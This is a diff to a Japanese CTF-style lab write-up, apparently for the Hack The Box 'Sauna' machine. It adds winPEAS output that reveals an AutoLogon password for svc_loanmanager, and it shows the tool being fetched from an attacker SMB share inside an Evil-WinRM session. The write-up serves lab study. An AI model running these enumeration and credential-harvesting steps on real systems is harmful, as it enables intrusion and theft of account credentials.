@@ -184,10 +184,10 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 [*] Config file parsed
 ```
-```sh
+```powershell
 *Evil-WinRM* PS C:\Users\FSmith\Documents> copy \\10.10.16.12\share\winPEASx64.exe .
 
-*Evil-WinRM* PS C:\Users\FSmith\Desktop> .\winPEASx64.exe userinfo quiet
+*Evil-WinRM* PS C:\Users\FSmith\Documents> .\winPEASx64.exe userinfo quiet
  [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
 ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
 Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
@@ -393,6 +393,16 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
        |                                 Thank you!                                      |                                                                                                                                                  
        \---------------------------------------------------------------------------------/  
 ```
+autologonから、svc_loanmanager のパスワード判明！
+ただこのユーザはadministratorsではないもよう
+```powershell
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+```
+
 
 ## STEP 4
 ```sh
